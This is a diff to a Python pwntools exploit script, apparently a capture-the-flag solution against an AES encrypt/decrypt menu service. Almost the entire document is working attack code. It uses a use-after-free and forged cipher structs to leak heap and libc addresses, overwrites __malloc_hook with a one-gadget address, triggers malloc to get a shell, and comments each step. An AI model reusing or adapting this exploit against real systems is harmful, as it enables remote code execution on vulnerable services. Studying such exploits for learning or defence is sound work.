@@ -1,5 +1,4 @@
 from pwn import *
-#coding: utf8
 import sys
 from Crypto.Cipher import AES
 from binascii import b2a_hex, a2b_hex
@@ -57,7 +56,7 @@ def debug(addr):
     with open('/proc/%s/mem' % mypid) as mem:
         moduleBase = findModuleBase(mypid, mem)
         print "program_base",hex(moduleBase)
-        gdb.attach(p, "set follow-fork-mode parent\nb *" + hex(moduleBase+addr))
+        gdb.attach(p, "set follow-fork-mode child\nb *" + hex(moduleBase+addr))
 
 class prpcrypt():
     def __init__(self, key,iv):
@@ -85,8 +84,9 @@ class prpcrypt():
         return plain_text.rstrip('\0')
  
 
-def add(idx=1,way=1,key='1'*0x20,IV='a'*0x10,size=0,data=''):
-    p.recvuntil('3. Go')
+def add(idx=1,way=1,key='1'*0x20,IV='a'*0x10,size=0,data='',go_flag=False):
+    if not go_flag:
+        p.recvuntil('3. Go')
     p.sendline('1')
     p.recvuntil('id : ')
     p.sendline(str(idx))
@@ -101,40 +101,9 @@ def add(idx=1,way=1,key='1'*0x20,IV='a'*0x10,size=0,data=''):
     p.recvuntil('Data : ')
     p.send(data)
 
-def add2(idx=1,way=1,key='1'*0x20,IV='a'*0x10,size=0,data=''):
-    p.recvuntil('3. Go')
-    p.sendline('1')
-    p.recvuntil('id : ')
-    p.sendline(str(idx))
-    p.recvuntil('(2): ')
-    p.sendline(str(way))
-    p.recvuntil('Key : ')
-    p.send(key)
-    p.recvuntil('IV : ')
-    p.send(IV)
-    p.recvuntil('Size : ')
-    p.sendline(str(size))
-    p.recvuntil('Data : ')
-    p.send(data)
-
-def add1(idx=1,way=1,key='1'*0x20,IV='a'*0x10,size=0,data=''):
-    #p.recvuntil('3. Go')
-    p.sendline('1')
-    p.recvuntil('id : ')
-    p.sendline(str(idx))
-    p.recvuntil('(2): ')
-    p.sendline(str(way))
-    p.recvuntil('Key : ')
-    p.send(key)
-    p.recvuntil('IV : ')
-    p.send(IV)
-    p.recvuntil('Size : ')
-    p.sendline(str(size))
-    p.recvuntil('Data : ')
-    p.send(data)
-
-def delete(idx):
-    p.recvuntil('3. Go')
+def delete(idx,go_flag=False):
+    if not go_flag:
+        p.recvuntil('3. Go')
     p.sendline('2')
     p.recvuntil('id : ')
     p.sendline(str(idx))
@@ -150,151 +119,127 @@ def go(idx):
     p.sendline(str(idx))
 
 def pwn():
-    #debug(0x921)
-    
-    
-    add(9999,1,size=0x10,data='B'*0x10)
-    add(1,1,size=0x10,data='1'*0x10)
-    add(2,1,size=0x10,data='1'*0x10)
-    add(3,1,size=0x70,data='1'*0x70)
-    
-    add(4,1,size=0x10,data='1'*0x10)
-    add(5,1,size=0x10,data='1'*0x10)
-    delete(4)
-    delete(2)
-    go(1)
-    
-    delete1(1)
-    delete(3)
-    add(6,1,size=0x10,data='1'*0x10)
-    add(7,1,size=0x20,data='1'*0x20)
+    pc = prpcrypt('1'*0x20,'a'*0x10) #aes algrithom
+    #
+    add(9999,1,size=0x10,data='a'*0x10) #use to get shell.
+    add(999,1,size=0x10,data='a'*0x10)  #enc_struct to build fake enc
+    #debug(0x1253)
+    add(99,2,size=0x10,data='a'*0x10)   #dec_struct to build fake dec
 
+    ## step 1 leak heap address
+    add(0,1,size=0x70,data='a'*0x70)
+    add(1,1,size=0x20,data='a'*0x20)
+    add(2,1,size=0x70,data='a'*0x70)
+   
+    
+    delete(0)
+    go(1)
+    delete(1,True)
+    delete(2)
+    add(4,1,size=0x20,data='a'*0x20)
+    add(5,1,size=0x20,data='a'*0x20)   # 1 chunk's enc_struct must be malloced out,after this operation, there are still 3 chunks with size of 0x80 and 1 chunk with size 0xb0, i don't know somehow there is one more chunk with size 0x110, maybe for aes algorithm
+
+    ### leak
     p.recvuntil('text: \n')
     
     data=p.recvuntil('\n')
     data=data.replace(" ",'').strip()
-    #data1=p.recvuntil('\n')
-    #data1=data1.replace(" ",'').strip()
-    #data=data+data1
-    print data
-    
-    pc = prpcrypt('1'*0x20,'a'*0x10)      
-    #e = pc.encrypt("1"*0x20)
+    #print data
+         
     d = pc.decrypt(data)                     
-    print d
-    addr=u64(d[:8])
-    print hex(addr)
-    offset=0x260
-    heap_base=addr-0x1a00-offset
-    print "heap base",hex(heap_base)
-    #p.interactive()
-    add1(0,1,size=0x10,data='1'*0x10)
-    add(0,1,size=0x10,data='1'*0x10)
-    add(0,1,size=0x10,data='1'*0x10)
-
+    heap_addr=u64(d[:8])
+    #print hex(heap_addr)
+    heap_base=heap_addr-0x1be0
+    enc_struct_addr=heap_base+0x1300
+    dec_struct_addr=heap_base+0x17c0
+    print "heap_base",hex(heap_base)
     
+    ### do some thing clean the tcache list
+    add(6,1,size=0x70,data='a'*0x70,go_flag=True)
+    add(7,1,size=0x70,data='a'*0x70)
 
-    #add(0,1,size=0x10,data='1'*0x10)
-    #debug(0x1253)
-    add(99,1,size=0x10,data='1'*0x10)
-    add(98,2,size=0x10,data='1'*0x10)
-    
-    struct_enc=heap_base+0x2270+offset
-    struct_dec=heap_base+0x24d0+offset
-    libc_heap=heap_base+0x4e00+offset
+    ## step 2 uaf to leak libc address.
+
+    ### first free chunk to unsorted bin chunk to get libc address.
     for i in range(0,7):
-        add(100+i,1,size=0x300,data='1'*0x300)
-    add(97,1,size=0x300,data='1'*0x300)
-    add(11,1,size=0x10,data='1'*0x10)
-    add(12,1,size=0x70,data='1'*0x70)
-    add(13,1,size=0x10,data='1'*0x10)
+        add(100+i,1,size=0x80,data='a'*0x80)
+    #debug(0x1253)
+    add(200,1,size=0x80,data='a'*0x80) # which chunk of content use to leak libc address
+    
+    leak_libc_heap=heap_base+0x3b10
+    add(201,1,size=0x30,data='a'*0x30) # 
     for i in range(0,7):
         delete(100+i)
-    delete(97)
     
-    for i in range(0,4):
-        add(50+i,1,size=0x10,data='1'*0x10)
-    #debug(0x1597)
-    go(11)
+    ### malloc out one chunk with size of 0x80
+    add(201,1,size=0x70,data='a'*0x70)
     
-    delete1(11)
-    delete(12)
-    fake_struct=p64(libc_heap)+p64(0x10)+p32(1)+'1'*0x20+'a'*0x10+p32(0)+p64(0)+p64(0)+p64(struct_enc)+p64(0xb)+p64(0)
-    add(12,1,size=0x10,data='1'*0x10)
-    add(96,1,size=0x70,data=fake_struct)
+    ### go with 200 and free 200 and 201 and add one which will build a fake struct(uaf in 200)
+    #debug(0x15c6)
+    go(200)
+    p.recvuntil('Prepare...')
+    #debug(0x14f3)
+    delete(200,True)
+    delete(201)
+    
+    fake_enc=p64(leak_libc_heap)+p64(0x10)+p32(1)+'1'*0x20+'a'*0x10+p32(0)+p64(0)+p64(0)+p64(enc_struct_addr)+p64(0xb)+p64(0)
+    add(203,1,size=0x70,data=fake_enc)  ## the key to leak libc
     
     p.recvuntil('text: \n')
     
     data=p.recvuntil('\n')
     data=data.replace(" ",'').strip()
-
+    print data
+         
     d = pc.decrypt(data)                     
-    print d
-    addr=u64(d[:8])
-    print hex(addr)
-    libc_base=addr-0x3ebca0
+    libc_addr=u64(d[:8])
+    #print hex(libc_addr)
+    libc_base=libc_addr-0x3ebca0
     print "libc_base",hex(libc_base)
+    rce=libc_base+0x10a38c 
     malloc_hook=libc_base+libc.symbols['__malloc_hook']
+    ## step uaf to write a fastbin chunk
     
-    add1(8,1,size=0x10,data='a'*0x10)
-    for i in range(0,10):
-        add(8,1,size=0x10,data='a'*0x10)
+    ### do some thing to clean the tcache
+    add(100+0,1,size=0x80,data='a'*0x80,go_flag=True)
+    for i in range(1,7):
+        add(100+i,1,size=0x80,data='a'*0x80)
     
-    aa='a'*0x1000
-    print len(pc.encrypt(aa).decode('hex'))
-    data=pc.encrypt((p64(malloc_hook-0x14)+p64(0x10))*8)
+    payload=p64(malloc_hook)*4
+    payload=pc.encrypt(payload)
+    payload=payload.decode('hex')
     
-    data=data.decode('hex')
-    print len(data),data
-    add(1,2,size=0x10,data='a'*0x10)
-    add(2,2,size=0x70,data='a'*0x70)
+    #debug(0x12f5)
+    payload_addr=heap_base+0x4180
+    add(1000,1,size=0x1000,data=payload*(0x1000/len(payload)))
+    add(300,1,size=0x30,data='a'*0x30)
+    add(301,1,size=0x70,data='a'*0x70)
+    #debug(0x14f3)
+    delete(9999)  # free the evil
+    evil_addr=heap_base+0x14c0
+    global_ptr=evil_addr-0x1260
     #debug(0x15c6)
+    go(300)
+    delete(300,go_flag=True)
+    delete(301)
+    add(400,1,size=0x30,data='a'*0x30)
+    fake_dec=p64(payload_addr-0x30)+p64(0x1000+0x30)+p32(1)+'1'*0x20+'a'*0x10+p32(0)+p64(0)+p64(0)+p64(dec_struct_addr)+p64(0xb)+p64(0)
+    add(401,1,size=0x70,data=fake_dec)  ## the key to overwrite the fastbin chunk
+    data=p64(rce)*(0x70/8)
+    
+    sleep(2)
     #debug(0x12f5)
-    add(3,2,size=0x1000,data=data*(0x1000/len(data)))
-    #p.interactive()
-    delete(9999)
-    go(1)
-    print p.recvuntil('Prepare...')
-    delete1(1)
-    #delete(98)
-    delete(2)
-    add(4,2,size=0x10,data='a'*0x10)
-    addr=heap_base+0x7230
-    fake_struct=p64(addr-0x800)+p64(0x1300)+p32(1)+'1'*0x20+'a'*0x10+p32(0)+p64(0)+p64(0)+p64(struct_dec)+p64(0xb)+p64(0)
-    #fake_struct=p64(addr)+p64(0x10)+p32(1)+'1'*0x20+'a'*0x10+p32(0)+p64(0)+p64(0)+p64(struct_dec)+p64(0xb)+p64(0)
+    #haha ,overwrite the malloc_hook to rce
+    add(500,1,size=0x70,data=data)
     
-    
-    add(5,2,size=0x70,data=fake_struct)
-    rce=libc_base+0x10a38c
-    
-    
-    sleep(5)
-    
-    #debug(0x12f5)
-    add2(6,1,size=0x10,data=p64(rce)*2)
-    #sleep(3)
-    #debug(0x12f5)
-    #raw_input('456')
-    #debug(0x13be)
-
-    p.sendline('1')
-    p.recvuntil('id : ')
-    p.sendline(str(1))
-    p.recvuntil('(2): ')
-    p.sendline(str(1))
-    p.recvuntil('Key : ')
-    p.send(p64(rce)*4)
-    '''
-    add2(6,1,size=0x10,data=p64(rce)*2)
-    
+    #trigger malloc
     p.recvuntil('3. Go')
     p.sendline('1')
     p.recvuntil('id : ')
-    p.sendline(str(1))
-    p.recvuntil('(2): ')
-    p.sendline(str(1))
-    #debug(0x12f5)
-    '''
+    p.sendline('1')
+    p.recvuntil(':')
+    p.sendline('1')
+    
     p.interactive()
     
 
